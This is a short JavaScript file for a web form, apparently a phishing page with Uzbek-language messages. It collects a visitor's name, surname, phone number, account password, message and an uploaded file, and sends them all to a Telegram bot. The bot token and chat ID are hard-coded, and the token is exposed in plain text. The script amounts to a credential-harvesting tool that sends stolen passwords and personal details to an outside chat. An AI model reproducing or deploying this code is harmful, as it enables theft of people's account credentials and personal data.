let bot = new Bot("5734013883:AAGfiYKPwtbg7ZPdwM7uEZqgYXu9FzdLxWw", "5692671102");

document.getElementById('fileInput').addEventListener("change",()=>{
  document.getElementById('imgurl').innerHTML = document.getElementById('fileInput').value
})

document.querySelector('.action-button').addEventListener("click",()=>{
  if(document.querySelector('#fileInput').value.length > 0 ){
    

  }
  else{
    alert("ILtimos Rasm jonatish  toldiring")
  }
  


})


addEventListener("submit", e => {
e.preventDefault();
const text1 = document.getElementById("text1").value;
const text2 = document.getElementById('text2').value;
const text3 = document.getElementById('text3').value;
const text4 = document.getElementById('text4').value;
const text5 = document.getElementById('text5').value;
const dd =  `
Ismi : ${ text1}
%0A
Familyasi : ${ text2}
%0A
Telefon raqami : ${text4}
%0A
Akkaunt paroli: ${text5}
%0A
Qisqa habar : ${ text3}
%0A
`

bot.sendFile('#fileInput', dd )

bot['requestUrl']

if (bot['requestUrl'] == 'https://api.telegram.org/bot') {
alert("Habar jonatildi")

document.getElementById('text1').value = '';
document.getElementById('text2').value = '';
document.getElementById('text3').value = '';
document.getElementById('text4').value = '';
document.getElementById('text5').value = '';


}
else{
  
alert("Habar jonatilmadi Qayta urinib koring")

}
    })
    